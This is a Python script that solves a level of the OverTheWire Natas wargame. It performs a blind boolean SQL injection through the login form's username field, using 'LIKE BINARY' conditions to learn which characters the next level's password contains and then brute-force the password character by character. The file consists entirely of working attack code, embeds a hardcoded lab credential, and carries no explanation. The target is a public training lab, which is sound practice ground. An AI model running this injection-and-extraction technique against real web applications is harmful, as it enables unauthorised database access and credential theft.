#!/usr/bin/env python
import requests

possible_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
success_ans = 'This user exists.'

used_chars = ''

for char in possible_chars:
    payload = {'username': ('natas16" AND password LIKE BINARY "%%%c%%' % char)}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug=1', auth=('natas15', password), data=payload)
    if success_ans in r.text:
        used_chars += char

print used_chars

cracked_pass = ''
for i in range(32):
    for char in used_chars:
        new_pass = cracked_pass + char
        payload = {'username': ('natas16" AND password LIKE BINARY "%s%%' % new_pass)}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug=1', auth=('natas15', password), data=payload)
        if success_ans in r.text:
            cracked_pass += char
            print cracked_pass
            break
